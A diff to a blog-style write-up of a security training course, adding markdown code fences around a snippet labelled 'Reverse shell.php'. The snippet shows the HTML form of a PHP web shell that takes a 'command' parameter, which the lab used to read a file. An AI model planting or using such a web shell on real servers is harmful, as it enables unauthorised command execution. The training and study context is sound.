@@ -51,7 +51,8 @@ The activity itself had us 'login' to a SIEM \(Security Information and Event Ma
 Third day started with a small recap of blue teaming and then we got to red teaming too. So that was more hands on and it gave me quite some fun! I poked and prodded around and now I know even more than bafore and getting the right idea is over half of the battle. Basically we had to figure out how the 'attacker' got the shell inside and do the same, using the code below to cat one file. Also I kinda feel like the question about IP is mislabeled as RED TEAM when info from that is only available in logs. And RED TEAMERS should know their IPs already...
 
 Reverse shell.php:
->```<html>
+>```html
+><html>
 ><body>
 ><form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
 ><input type="text" name="command" autofocus id="command" size="50">
@@ -67,6 +68,7 @@ Reverse shell.php:
 ></pre>
 ></body>
 ></html>
+>```
 Useful commands:
 >| Command |	Use |
 >| --- | --- |
